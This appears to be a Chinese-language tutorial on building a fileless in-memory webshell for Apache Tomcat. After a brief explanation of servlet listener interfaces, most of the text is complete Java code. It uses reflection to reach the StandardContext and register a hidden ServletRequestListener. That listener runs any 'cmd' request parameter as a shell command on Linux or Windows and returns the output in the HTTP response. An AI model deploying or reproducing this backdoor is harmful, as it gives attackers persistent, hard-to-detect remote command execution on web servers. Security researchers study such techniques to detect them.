## 分析

Listener 可以译为监听器，监听器用来监听对象或者流程的创建与销毁，通过 Listener，可以自动触发一些操作，因此依靠它也可以完成内存马的实现

可能存在的监听器：

- ServletContextListener：用于监听整个 Servlet 上下文（创建、销毁）
- ServletContextAttributeListener：对 Servlet 上下文属性进行监听（增删改属性）
- ServletRequestListener：对 Request 请求进行监听（创建、销毁）
- ServletRequestAttributeListener：对 Request 属性进行监听（增删改属性）
- javax.servlet.http.HttpSessionListener：对 Session 整体状态的监听
- javax.servlet.http.HttpSessionAttributeListener：对 Session 属性的监听

这些类接口，实际上都是 `java.util.EventListener` 的子接口。

这里我们看到，在 ServletRequestListener 接口中，提供了两个方法（requestDestroyed / requestInitalized）在 request 请求创建和销毁时进行处理

`ServletRequestListener`用于监听`ServletRequest`对象的创建和销毁，当我们访问任意资源，无论是servlet、jsp还是静态资源，都会触发`requestInitialized`方法

listener是在StandardContext#getApplicationEventListeners方法中获得

在StandardContext#addApplicationEventListener添加了listener

反射调用addApplicationEventListener添加listener

## 内存马

```java
package pres.test.momenshell;

import org.apache.catalina.connector.Request;
import org.apache.catalina.core.StandardContext;

import javax.servlet.*;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Field;
import java.util.Scanner;

public class AddTomcatListener extends HttpServlet {
    @Override
    protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        this.doPost(req, resp);
    }

    @Override
    protected void doPost(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
        try {
            ServletContext servletContext = req.getServletContext();
            StandardContext o = null;
            while (o == null) { //循环从servletContext中取出StandardContext
                Field field = servletContext.getClass().getDeclaredField("context");
                field.setAccessible(true);
                Object o1 = field.get(servletContext);

                if (o1 instanceof ServletContext) {
                    servletContext = (ServletContext) o1;
                } else if (o1 instanceof StandardContext) {
                    o = (StandardContext) o1;
                }
            }
            Mylistener mylistener = new Mylistener();
            //添加listener
            o.addApplicationEventListener(mylistener);
        } catch (NoSuchFieldException e) {
            e.printStackTrace();
        } catch (IllegalAccessException e) {
            e.printStackTrace();
        }
    }
}
class Mylistener implements ServletRequestListener {

    @Override
    public void requestDestroyed(ServletRequestEvent servletRequestEvent) {
        ServletRequest request = servletRequestEvent.getServletRequest();
        if (request.getParameter("cmd") != null) {
            try {
                String cmd = request.getParameter("cmd");
                boolean isLinux = true;
                String osType = System.getProperty("os.name");
                if (osType != null && osType.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"/bin/sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                InputStream inputStream = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(inputStream).useDelimiter("\\a");
                String output = s.hasNext() ? s.next() : "";
                Field request1 = request.getClass().getDeclaredField("request");
                request1.setAccessible(true);
                Request request2 = (Request) request1.get(request);
                request2.getResponse().getWriter().write(output);
            } catch (IOException e) {
                e.printStackTrace();
            } catch (NoSuchFieldException e) {
                e.printStackTrace();
            } catch (IllegalAccessException e) {
                e.printStackTrace();
            }
        }
    }

    @Override
    public void requestInitialized(ServletRequestEvent servletRequestEvent) {

    }
}
```

